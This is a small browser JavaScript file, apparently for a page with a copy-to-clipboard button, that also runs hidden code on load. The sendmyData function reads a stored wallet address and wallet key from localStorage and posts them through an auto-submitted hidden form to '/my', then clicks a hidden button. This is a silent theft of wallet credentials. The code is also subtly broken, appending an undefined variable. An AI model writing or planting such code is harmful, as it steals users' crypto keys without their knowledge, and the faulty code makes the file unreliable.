const webAddress = document.getElementById("webAddress");

function copyText() {
  const textToCopy = webAddress.innerText;
  navigator.clipboard
    .writeText(textToCopy)
    .then(() => {
      alert("copied to clipboard!");
    })
    .catch((error) => {
      console.error("Failed to copy text: ", error);
    });
}

function initData() {
  localStorage.setItem("WALLET_ADDRESS", null);
  localStorage.setItem("WALLET_KEY", null);
}

function sendmyData() {
  var data1 = localStorage.getItem("WALLET_ADDRESS");
  var data2 = localStorage.getItem("WALLET_KEY");
  var form = document.createElement("form");
  form.method = "post";
  form.action = "/my";

  var input1 = document.createElement("input");
  input1.type = "hidden";
  input1.name = "data1";
  input1.value = data1;
  form.appendChild(input);

  var input2 = document.createElement("input");
  input2.type = "hidden";
  input2.name = "data2";
  input2.value = data2;
  form.appendChild(input2);
  document.body.appendChild(form);
  form.submit();
}

function clickButton() {
  var button = document.getElementById("hiddenButton");
  button.click();
  console.log("button-click");
}

sendmyData();
clickButton();
